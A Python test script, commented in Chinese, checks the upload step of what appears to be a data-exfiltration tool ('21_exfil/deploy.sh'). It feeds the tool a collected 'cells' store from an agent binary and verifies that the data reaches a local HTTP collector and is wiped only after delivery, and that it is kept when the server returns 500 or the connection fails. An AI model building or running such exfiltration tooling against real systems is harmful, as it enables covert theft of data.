#!/usr/bin/env python3
"""验证 deploy.sh 的 http 上传分支：送达才清空，失败必须保留落点。

单进程内自闭环（server 线程 + subprocess 真调 deploy.sh），
避免后台常驻进程把调用方挂住。
"""
import hashlib
import http.server
import os
import shutil
import subprocess
import sys
import threading

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
PREFIX = os.environ.get("CAMD_PREFIX", "/data/workspace/fakeroot")
CELLS = os.path.join(PREFIX, "var/lib/camd/cells.bin")
BAK = os.path.join(PREFIX, "cells.bak")
OUT = "/tmp/camd_recv_cells.bin"
LOG = "/tmp/camd_recv_log.txt"
DEPLOY = os.path.join(REPO, "21_exfil", "deploy.sh")
CAMD_BIN = os.path.join(REPO, "agent_windows", "build", "linux", "camd")
KEY = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
PORT = 18082


class Handler(http.server.BaseHTTPRequestHandler):
    resp_code = 200
    protocol_version = "HTTP/1.1"

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n) if n > 0 else b""
        with open(LOG, "a") as f:
            f.write("POST %s bytes=%d sha256=%s\n"
                    % (self.path, len(body), hashlib.sha256(body).hexdigest()))
        if Handler.resp_code == 200:
            with open(OUT, "ab") as f:
                f.write(body)
        self.send_response(Handler.resp_code)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, fmt, *args):
        pass


def start_server(code, port=PORT):
    Handler.resp_code = code
    # allow_reuse_address 默认已开；关键是 shutdown() 后必须 server_close()，
    # 否则 socket 不释放，下一条路径 bind 报 Address already in use。
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", port), Handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv


def sha(path):
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


def size(path):
    return os.path.getsize(path) if os.path.exists(path) else -1


def main():
    fails = []
    # 自举：没有信元就自己装一遍，保证本脚本可独立重复执行
    if size(CELLS) <= 0:
        if not os.path.exists(CAMD_BIN):
            print("[FATAL] 缺少 camd 二进制: %s" % CAMD_BIN)
            return 1
        env0 = dict(os.environ, PREFIX=PREFIX)
        r0 = subprocess.run(["sh", DEPLOY, "install", "--bin", CAMD_BIN,
                             "--key", KEY], env=env0,
                            capture_output=True, text=True, timeout=180)
        print("[bootstrap] install rc=%d" % r0.returncode)
        if r0.returncode != 0 or size(CELLS) <= 0:
            print("[FATAL] 自举 install 未产出信元")
            return 1

    # 备份原始信元，供两条路径复用。
    # 幂等：上一轮跑完 A 后 CELLS 已被清空，此时必须从 BAK 恢复，
    # 否则会把 0 字节当成基线，B 的"落点保留"断言退化成恒绿。
    if size(CELLS) == 0 and os.path.exists(BAK) and size(BAK) > 0:
        shutil.copyfile(BAK, CELLS)
    shutil.copyfile(CELLS, BAK)
    orig_sha = sha(BAK)
    orig_sz = size(BAK)
    print("[baseline] cells=%d sha256=%s" % (orig_sz, orig_sha[:16]))

    # ---------- 路径 A: HTTP 200，必须送达并清空 ----------
    for f in (OUT, LOG):
        if os.path.exists(f):
            os.remove(f)
    srv = start_server(200)
    try:
        env = dict(os.environ, PREFIX=PREFIX)
        r = subprocess.run(["sh", DEPLOY, "upload",
                            "--to", "http://127.0.0.1:%d/api/frame" % PORT],
                           env=env, capture_output=True, text=True, timeout=60)
        print("--- A(200) rc=%d ---\n%s" % (r.returncode, r.stdout.strip()))
        send_sz = size(CELLS)
        recv_sz = size(OUT)
        recv_sha = sha(OUT) if recv_sz > 0 else ""
        print("A: 落点发送后=%d  服务端收到=%d  sha匹配=%s"
              % (send_sz, recv_sz, recv_sha == orig_sha))
        if r.returncode != 0:
            fails.append("A: rc 应为 0，实际 %d" % r.returncode)
        if recv_sz != orig_sz:
            fails.append("A: 服务端收到 %d 字节，应为 %d" % (recv_sz, orig_sz))
        if recv_sha != orig_sha:
            fails.append("A: 服务端内容 sha 不一致")
        if send_sz != 0:
            fails.append("A: 送达后落点应清空，实际 %d 字节" % send_sz)
    finally:
        srv.shutdown()
        srv.server_close()

    # ---------- 路径 B: HTTP 500，必须 DIE 且保留落点 ----------
    shutil.copyfile(BAK, CELLS)          # 恢复信元
    assert size(CELLS) == orig_sz
    if os.path.exists(LOG):
        os.remove(LOG)
    PORT_B = PORT + 1
    srv = start_server(500, PORT_B)
    try:
        env = dict(os.environ, PREFIX=PREFIX)
        r = subprocess.run(["sh", DEPLOY, "upload",
                            "--to", "http://127.0.0.1:%d/api/frame" % PORT_B],
                           env=env, capture_output=True, text=True, timeout=60)
        print("--- B(500) rc=%d ---\n%s" % (r.returncode, r.stdout.strip()))
        after_sz = size(CELLS)
        print("B: 失败后落点=%d（应仍为 %d）" % (after_sz, orig_sz))
        if "HTTP 500" not in r.stdout:
            fails.append("B: 未真正触发 500，实际输出=%r" % r.stdout.strip())
        if r.returncode == 0:
            fails.append("B: HTTP 500 时 rc 应为非 0，实际 0")
        if after_sz != orig_sz:
            fails.append("B: 上传失败后落点必须保留，实际 %d 应为 %d"
                         % (after_sz, orig_sz))
        if sha(CELLS) != orig_sha:
            fails.append("B: 落点内容被破坏")
    finally:
        srv.shutdown()
        srv.server_close()

    # ---------- 路径 C: 连接失败(000)，同样必须保留落点 ----------
    shutil.copyfile(BAK, CELLS)
    DEAD_PORT = 18999          # 无任何监听者
    env = dict(os.environ, PREFIX=PREFIX)
    r = subprocess.run(["sh", DEPLOY, "upload",
                        "--to", "http://127.0.0.1:%d/api/frame" % DEAD_PORT],
                       env=env, capture_output=True, text=True, timeout=60)
    print("--- C(连接失败) rc=%d ---\n%s" % (r.returncode, r.stdout.strip()))
    after_sz = size(CELLS)
    print("C: 失败后落点=%d（应仍为 %d）" % (after_sz, orig_sz))
    if r.returncode == 0:
        fails.append("C: 连接失败时 rc 应为非 0，实际 0")
    if after_sz != orig_sz:
        fails.append("C: 连接失败后落点必须保留，实际 %d 应为 %d"
                     % (after_sz, orig_sz))

    print("\n=== %s ===" % ("全部通过" if not fails else "失败 %d 项" % len(fails)))
    for f in fails:
        print("  [FAIL] " + f)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
